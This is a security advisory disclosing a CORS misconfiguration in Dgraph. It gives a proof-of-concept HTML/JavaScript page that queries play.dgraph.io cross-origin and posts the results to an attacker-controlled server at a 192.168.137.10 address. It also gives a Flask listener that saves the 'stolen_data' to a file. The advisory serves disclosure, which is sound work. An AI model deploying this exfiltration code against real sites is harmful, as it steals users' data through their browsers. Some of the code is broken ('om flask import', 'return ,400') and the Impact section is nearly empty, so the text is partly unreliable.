### Summary
It is possible to steal sensitive information from the platform such as logs, browser sessions, settings containing private API KEYS from other services; it is possible to make a user delete a project, send a message, etc. due to CORS misconfiguration.

Because the locally deployed dgraph service does not have relevant data, play.dgraphit.io is used for demonstration here

### Detail
Due to incorrect settings here
![image](https://github.com/user-attachments/assets/7330cfff-fcc8-4de1-b4f4-252aaa47c4a0)


1.We need to create an HTML file that can be deployed on the attacker's server, assuming it is accidentally accessed by the victim
The main task of this HTML is to access API interfaces in play.dgraphit.io that have vulnerabilities due to incorrect configuration, and return the resulting data obtained from the access to the attacker
```
<script>
fetch('https://play.dgraph.io/query?timeout=20s', {
  method: 'POST', 
  headers: {
    'Content-Type': 'application/graphql+-'
  },
  body: `
  {
      samples(func: has(<NRHP>), first: 10) {
          uid
          expand(_all_) {
            uid
            expand(_all_)
          }
      }
  }
  ` 
})
  .then(response => response.text()) 
  .then(data => {
    console.log('Got sensitive data:', data); 


    fetch('http://192.168.137.10:5000/steal-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ stolenData: data }) 
    })
    .then(response => response.text())
    .then(result => {
      console.log('send data success', result);
    })
    .catch(error => {
      console.error('send data failed:', error); 
    });
  })
  .catch(error => {
    console.error('No data:', error);
  });

</script>

```



2.The attacker also needs to create an HTTP server to receive the data
```
om flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  

@app.route('/steal-data', methods=['POST'])
def steal_data():
    data = request.get_json()
    
    if data:
        print(f"Received data: {data}")
        with open('stolen_data.txt', 'a') as f:
            f.write(str(data) + '\n')
        return "Got data", 200
    else:
        return ,400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
At the end, we obtained the data
![image](https://github.com/user-attachments/assets/7027ae92-730b-4aad-93c5-5bf8469105bf)


### Impact
dgraph/x /x.go 


### Refer 
[Github Origin](https://github.com/dgraph-io)  

[Github security](https://github.com/dgraph-io/dgraph/security/advisories/GHSA-jvx8-g626-pxr6)
